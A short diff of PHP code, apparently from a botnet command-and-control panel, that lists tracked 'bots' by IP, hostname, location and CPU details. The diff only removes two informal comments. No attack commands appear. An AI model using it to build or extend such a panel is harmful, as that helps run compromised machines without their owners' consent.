@@ -62,9 +62,9 @@
 		$SEARCHTABLE .= "</table>";
 	}
 
-	// Display all the bots in a really ugly way xD
+	// Display all the bots in a really ugly way
 	// $select = $conn->prepare("SELECT bot_key, bot_id, bot_version, bot_ip, bot_hostname, bot_location_country, bot_location_region, bot_location_city, bot_cpu_cores, bot_cpu_mhz, bot_cpu_bogus, bot_cpu_arch, bot_cpu_arch2, bot_date_last, bot_date_join FROM bots WHERE `bot_id` BETWEEN :first AND :second");
-	$select = $conn->prepare("SELECT * FROM bots WHERE `bot_id` BETWEEN :first AND :second"); // Why didn't I think of this
+	$select = $conn->prepare("SELECT * FROM bots WHERE `bot_id` BETWEEN :first AND :second");
 	$select->execute(array(
 		':first'=>$id2fetchstart,
 		':second'=>$id2fetchend
